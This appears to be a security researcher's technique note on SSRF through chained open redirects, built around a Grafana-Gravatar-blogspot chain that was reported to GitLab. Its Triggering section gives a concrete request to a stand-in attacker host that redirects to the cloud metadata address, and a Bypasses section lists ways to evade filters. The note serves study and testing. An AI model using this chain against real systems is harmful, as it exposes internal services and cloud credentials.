---
title: SSRF via Open Redirect Chain (Grafana Avatar / Gravatar)
slug: ssrf-via-open-redirect-chain
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/ssrf, technique/open-redirect, technique/chaining]
inbound: []
---

# SSRF via Open Redirect Chain

## Pattern

Server-side fetches that construct a destination URL from user-controlled
input can be chained through one or more open redirects on trusted third-party
domains to reach an internal target. Even when the initial URL is constrained
to a known domain prefix or suffix, an open redirect on that domain pivots
the HTTP client to an attacker-controlled location, which issues a final
redirect to the internal address.

## Preconditions

- Target application makes a server-side HTTP request where the URL is
  partially attacker-controlled (e.g., the path parameter).
- A trusted third-party domain (whitelisted by target) has an open redirect
  or permissive proxy endpoint.
- The application follows redirects without re-validating the destination IP.

## Detection

- Identify functionality that fetches remote URLs (avatar hash lookup,
  image proxy, webhook, uptime check).
- Check whether the constructed URL passes through a known third-party domain
  that has open-redirect endpoints (Gravatar's `d=` parameter, Google's
  `bp.blogspot.com` redirect, AMP caches, etc.).
- Confirm with an out-of-band DNS callback.

## Triggering

Example (Grafana avatar → Gravatar → blogspot → attacker → internal):

```
GET /avatar/<hash>?d=https://bp.blogspot.com/external/attacker.com HTTP/1.1
```

Then host a redirect on `attacker.com` pointing to `http://169.254.169.254/`.

## Bypasses

- Use `bp.blogspot.com` subdomain path trick to bypass partial-path blacklists.
- Chain multiple redirects if one redirect domain is also filtered.
- URL-encode the path to avoid basic string-match filters.

## Seen in the wild

- 2020-10-11 — GitLab (via Grafana), $12,000. Grafana avatar hash → Gravatar
  `d=` redirect → `bp.blogspot.com` pivot → attacker VPS → AWS metadata.
  Reported by Justin Gardner (Rhynorater). [BBRE](https://www.youtube.com/watch?v=Uklsk1WZ2EU)

## References

- Justin Gardner's blog on chained SSRF via open redirects
- See also: [octal-ip-ssrf](octal-ip-ssrf.md), [multi-a-dns-rebind](multi-a-dns-rebind.md)
